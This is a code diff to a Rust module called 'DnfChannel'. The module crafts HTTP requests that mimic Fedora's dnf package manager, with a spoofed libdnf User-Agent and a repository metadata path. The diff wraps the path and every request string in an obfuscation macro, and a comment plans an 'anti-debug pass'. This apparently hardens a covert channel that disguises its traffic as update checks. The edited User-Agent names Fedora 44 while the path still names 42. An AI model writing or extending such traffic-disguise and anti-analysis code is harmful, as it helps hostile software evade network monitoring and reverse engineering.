@@ -3,7 +3,7 @@ use crate::errors::ChannelError;
 use crate::dns;
 use crate::sys;
 use core::net::SocketAddr;
-
+use glimmer_obfstr::obfs;
 pub struct DnfChannel {
     host: String,
     port: u16,
@@ -23,7 +23,8 @@ impl DnfChannel {
         Self {
             host: host.to_string(),
             port,
-            path: "/pub/fedora/linux/updates/42/Everything/x86_64/os/repodata/repomd.xml".to_string(),
+            // will refactor to limit string time in memory in a anti-debug pass later
+            path: obfs!("/pub/fedora/linux/updates/42/Everything/x86_64/os/repodata/repomd.xml").to_string(),
             last_etag: std::cell::RefCell::new(String::new()),
         }
     }
@@ -169,18 +170,18 @@ impl DnfChannel {
 
     fn build_request(&self) -> Vec<u8> {
         let mut req = Vec::with_capacity(512);
-        req.extend_from_slice(b"GET ");
+        req.extend_from_slice(obfs!("GET ").as_bytes());
         req.extend_from_slice(self.path.as_bytes());
-        req.extend_from_slice(b" HTTP/1.1\r\n");
-        req.extend_from_slice(b"Host: ");
+        req.extend_from_slice(obfs!(" HTTP/1.1\r\n").as_bytes());
+        req.extend_from_slice(obfs!("Host: ").as_bytes());
         req.extend_from_slice(self.host.as_bytes());
-        req.extend_from_slice(b"\r\n");
-        req.extend_from_slice(b"User-Agent: libdnf (Fedora Linux 42; kde; Linux.x86_64)\r\n");
-        req.extend_from_slice(b"Accept: */*\r\n");
-        req.extend_from_slice(b"Cache-Control: no-cache\r\n");
-        req.extend_from_slice(b"Pragma: no-cache\r\n");
-        req.extend_from_slice(b"Connection: keep-alive\r\n");
-        req.extend_from_slice(b"\r\n");
+        req.extend_from_slice(obfs!("\r\n").as_bytes());
+        req.extend_from_slice(obfs!("User-Agent: libdnf (Fedora Linux 44; kde; Linux.x86_64)\r\n").as_bytes());
+        req.extend_from_slice(obfs!("Accept: */*\r\n").as_bytes());
+        req.extend_from_slice(obfs!("Cache-Control: no-cache\r\n").as_bytes());
+        req.extend_from_slice(obfs!("Pragma: no-cache\r\n").as_bytes());
+        req.extend_from_slice(obfs!("Connection: keep-alive\r\n").as_bytes());
+        req.extend_from_slice(obfs!("\r\n").as_bytes());
         req
     }
 
